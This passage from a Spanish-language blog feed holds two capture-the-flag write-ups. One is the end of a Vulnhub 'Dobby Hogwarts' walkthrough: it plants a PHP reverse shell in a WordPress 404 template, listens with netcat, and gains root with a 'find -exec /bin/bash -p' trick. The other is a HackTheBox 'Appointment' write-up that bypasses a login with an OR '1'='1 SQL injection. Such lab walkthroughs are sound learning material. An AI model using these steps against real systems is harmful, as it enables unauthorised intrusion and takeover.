![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/dobby_hogwarts/10.png){: .align-center}

Copiar php-reverse-shell.php de /usr/share/webshells/php a Documentos

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/dobby_hogwarts/11.png){: .align-center}

Cambiar el propietario del archivo con chown para poder editarlo

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/dobby_hogwarts/12.png){: .align-center}

Editarlo con nano para que lo IP sea la de nuestro equipo y el puerto que queramos poner como escucha

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/dobby_hogwarts/13.png){: .align-center}

Copiar todo el código e ir a la web de wordpress con el usuario de Draco

Ir a Apariencia -> editor de temas

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/dobby_hogwarts/14.png){: .align-center}

Seleccionar de la lista el de error 404

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/dobby_hogwarts/15.png){: .align-center}

Pegar el código y aplicar cambios

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/dobby_hogwarts/16.png){: .align-center}

Usar el comando nc para escuchar desde ese puerto
```bash
nc -nlvp 4444
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/dobby_hogwarts/17.png){: .align-center}

Ingresar un enlace inválido en wordpress

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/dobby_hogwarts/18.png){: .align-center}

Se abrirá el acceso a la Shell del equipo que tiene wordpress

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/dobby_hogwarts/19.png){: .align-center}

Ejecutar el comando
```bash
find . -exec /bin/bash -p \; -quit
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/dobby_hogwarts/20.png){: .align-center}

Nos dará acceso al bash en lugar de sh y con el usuario root

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/dobby_hogwarts/21.png){: .align-center}

Cambiamos al usuario dobby con la contraseña que encontramos antes (ilikesocks)

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/dobby_hogwarts/22.png){: .align-center}

Vamos al directorio /home/dobby y usamos el comando base32 al archivo flag1.txt para poder leer archivos dado que cat no funciona

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/dobby_hogwarts/23.png){: .align-center}

Usamos la web dcode.fr/identification-chiffrement para saber que cifrado está utilizando y nos saldrá que es base32

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/dobby_hogwarts/24.png){: .align-center}

Lo pasamos por un descifrador de base32

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/dobby_hogwarts/25.png){: .align-center}

Y saldrá otra flag nueva, repetimos el proceso de detectar que cifrado usa

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/dobby_hogwarts/26.png){: .align-center}

Y nos dirá ques cifrado md5, lo desciframos

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/dobby_hogwarts/27.png){: .align-center}

Nos saldrá un mensaje que dice goodjob

Esto, no sirve para nada realmente

Ahora miramos el directorio del usuario root

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/dobby_hogwarts/28.png){: .align-center}

Y leemos el archivo llamado proof.txt

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/dobby_hogwarts/29.png){: .align-center}]]></content><author><name>TheZombrex</name></author><category term="vulnhub" /><category term="vulnhub" /><category term="easy" /><category term="writeup" /><summary type="html"><![CDATA[[Easy][Vulnhub] Writeup de Dobby hogwarts.]]></summary></entry><entry><title type="html">Appointment</title><link href="http://localhost:4000/hackthebox/appointment/" rel="alternate" type="text/html" title="Appointment" /><published>2022-07-30T00:00:00+02:00</published><updated>2022-07-30T00:00:00+02:00</updated><id>http://localhost:4000/hackthebox/appointment</id><content type="html" xml:base="http://localhost:4000/hackthebox/appointment/"><![CDATA[# Preguntas

**What does the acronym SQL stand for?**

Structured Query Language

**What is one of the most common type of SQL vulnerabilities?**

SQL injection

**What does PII stand for?**

Personally Identifiable Information  

**What does the OWASP Top 10 list name the classification for this vulnerability?**

A03:2021-Injection  

**What service and version are running on port 80 of the target?**

Apache httpd 2.4.38 ((Debian))

**What is the standard port used for the HTTPS protocol?**

443

**What is one luck-based method of exploiting login pages?**

brute-forcing

**What is a folder called in web-application terminology?**

directory

**What response code is given for "Not Found" errors?**

404

**What switch do we use with Gobuster to specify we're looking to discover directories, and not subdomains?**

dir

**What symbol do we use to comment out parts of the code?**

\#

# Proceso

Entrar al sitio web desde el navegador poniendo la ip, aparecerá un login

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/htb/appointment/1.png){: .align-center}

Tratar de entrar mediante inyección de SQL del siguiente modo

Usuario= admin

Contraseña= wrongpassword' OR '1'='1

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/htb/appointment/2.png){: .align-center}

Dará acceso mostrando un mensaje con el flag  

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/htb/appointment/3.png){: .align-center}]]></content><author><name>TheZombrex</name></author><category term="hackthebox" /><category term="hackthebox" /><category term="StartingPoint" /><category term="writeup" /><summary type="html"><![CDATA[[StartingPoint][HackTheBox] Writeup de appointment.]]></summary></entry></feed>